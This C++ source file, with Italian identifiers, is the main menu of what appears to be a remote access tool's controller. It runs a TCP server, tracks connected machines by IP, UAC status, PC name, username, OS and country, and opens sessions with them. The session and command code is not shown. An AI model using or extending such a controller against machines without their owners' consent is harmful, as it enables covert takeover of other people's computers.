#include <iostream>
#include <EssNet.h>
#include <Essentials.h>
#include <EssCurl.h>

using namespace std;

#define MAX_CLIENTS 1000

#include "Client.h"

string Version = "2.0.0";
CLIENT Clients[MAX_CLIENTS];

#include "Classi.h"

ClientUtils* Clu;

#include "Comunicazioni.h"
#include "Funzioni.h"

int main()
{
    CLInterface cli;
    TextColor tc;
    DirUtils du;
    Settaggi settaggi;
    ConsoleUtils cu;
    WindowUtils wu;
    TcpIP Server;
    Clu = new ClientUtils(settaggi);

    VectString MenuPrincipale;
    VectString HeaderTabella;
    VectString BodyTabella;

    bool CicloMenu = true;

    cli.LoadingPercentage = 0;
    cli.LoadingText = "Caricamento Menu Principale...";
    cli.FullBarWithText(25);

    MenuPrincipale.push_back("Esci");
    MenuPrincipale.push_back("Connetti Sessione");
    MenuPrincipale.push_back("Crea Client");
    MenuPrincipale.push_back("Comandi Comuni");
    MenuPrincipale.push_back("Impostazioni");

    cli.LoadingPercentage = 10;
    cli.LoadingText = "Caricamento Tabella Clients...";

    HeaderTabella.push_back("ID");
    HeaderTabella.push_back("IP");
    HeaderTabella.push_back("Ver");
    HeaderTabella.push_back("UAC");
    HeaderTabella.push_back("Nome PC");
    HeaderTabella.push_back("UserName");
    HeaderTabella.push_back("OS");
    HeaderTabella.push_back("Stato");

    cli.LoadingPercentage = 20;
    cli.LoadingText = "Rimozione Update...";

    du.SetCurrDir(du.GetModuleFilePath());
    if (du.CheckDir("Update"))
        du.DelDir("Update");

    cli.LoadingPercentage = 30;
    cli.LoadingText = "Caricamento Impostazioni...";

    if (!settaggi.GetSettings())
    {
        cli.StopBar(250);

        tc.SetColor(tc.Red);
        cout << "Errore nel caricamento delle impostazioni." << endl;
        _getch();
        return 0;
    }

    cli.LoadingPercentage = 40;
    cli.LoadingText = "Controllo Aggiornamenti...";

    if (settaggi.VerificaAggiornamenti)
        VerificaAggiornamenti(settaggi.AutoAggiornamento);

    cli.LoadingPercentage = 50;
    cli.LoadingText = "Impostazione Finestra...";

    Clu->AggiornaTitolo(Clu->Menu);
    wu.SetWindowSize({ settaggi.DimensioniFinestra.X, settaggi.DimensioniFinestra.Y });

    cli.LoadingPercentage = 60;
    cli.LoadingText = "Avvio Server...";

    Server.Port = settaggi.Porta;
    if (Server.StartServer() != 0)
    {
        cli.StopBar(250);

        tc.SetColor(tc.Red);
        cout << "Errore nell'avvio del server." << endl;
        Server.Stop();
        _getch();
        return 0;
    }

    cli.LoadingPercentage = 90;
    cli.LoadingText = "Avvio Servizi...";

    thread Aconn(AccettaConnessioni, ref(Server));
    thread Vconn(VerificaConnessioni);
    Aconn.detach();
    Vconn.detach();

    cli.LoadingPercentage = 100;
    cli.LoadingText = "Completato";
    cli.StopBar(1000);

    while (CicloMenu)
    {
        system("cls");
        StampaTitolo(1);
        cli.SubTitle("Menu Principale", 60, tc.Green);

        switch (cli.MenuSingleSelQuadre(MenuPrincipale))
        {
            // Esci
            case 0:
                // funzione per gestire la chiusura della connessione con i client attivi
                Server.Stop();
                CicloMenu = false;
                break;

            // Connetti Sessione
            case 1:
                system("cls");
                StampaTitolo(1);
                cli.SubTitle("Lista Clients", 60, tc.Green);

                BodyTabella.clear();
                for (int i = 0; i < MAX_CLIENTS; i++)
                {
                    if (Clients[i].IsConnected)
                    {
                        BodyTabella.push_back(to_string(i));
                        BodyTabella.push_back(Clients[i].info.IP);
                        BodyTabella.push_back(Clients[i].info.Versione);
                        BodyTabella.push_back(Clients[i].info.UAC);
                        BodyTabella.push_back(Clients[i].info.PCname);
                        BodyTabella.push_back(Clients[i].info.UserName);
                        BodyTabella.push_back(Clients[i].info.OS);
                        BodyTabella.push_back(Clients[i].info.Location.CountryCode);
                    }
                }

                if (BodyTabella.size() > 0)
                {
                    int IDclient = -1;
                    bool Controllo = false;

                    cli.Table(HeaderTabella, BodyTabella);
                    cout << "\nScegli l'ID del Client." << endl;
                    StampaPrefix();
                    cin >> IDclient;
                    cin.ignore();

                    if (IDclient < MAX_CLIENTS && IDclient >= 0)
                    {
                        if (Clients[IDclient].IsConnected)
                            Sessione(IDclient, Clients[IDclient].sock);
                        else
                            Controllo = true;
                    }
                    else
                        Controllo = true;

                    if(Controllo)
                    {
                        cout << "ID non valido.";
                        Sleep(2000);
                    }
                }
                else
                {
                    cout << "Non hai Clients connessi." << endl;
                    Sleep(2000);
                }

                break;

            // Crea Client
            case 2:
                return 0;
                break;

            // Comandi Comuni
            case 3:
                return 0;
                break;

            // Impostazioni
            case 4:
                while (CicloMenu)
                {
                    system("cls");
                    StampaTitolo(1);
                    cli.SubTitle("Impostazioni", 60, tc.Green);

                    settaggi.GetSettings();

                    switch (settaggi.ShowSettings())
                    {
                        // Esci
                        case 0:
                            CicloMenu = false;
                            break;

                        // Porta
                        case 1:
                            cout << "\nInserisci la porta." << endl;
                            StampaPrefix();
                            cin >> settaggi.Porta;
                            cin.ignore();
                            break;

                        // Aggiornamenti
                        case 2:
                            settaggi.VerificaAggiornamenti = !settaggi.VerificaAggiornamenti;
                            break;

                            // Auto Aggiornamenti
                        case 3:
                            settaggi.AutoAggiornamento = !settaggi.AutoAggiornamento;
                            break;

                        // Colori
                        case 4:
                            //TODO implementare l'impostazione dei colori
                            break;

                        // Dimensione della finestra
                        case 5:
                            cout << "\nRidimensiona le finestra a piacimento e premi invio per salvare." << endl;
                            _getch();

                            settaggi.DimensioniFinestra.X = wu.GetWindowSize().X;
                            settaggi.DimensioniFinestra.Y = wu.GetWindowSize().Y;
                            break;
                    }

                    settaggi.SetSettings();
                }
                
                CicloMenu = true;
                break;
        }
    }

    return 0;
}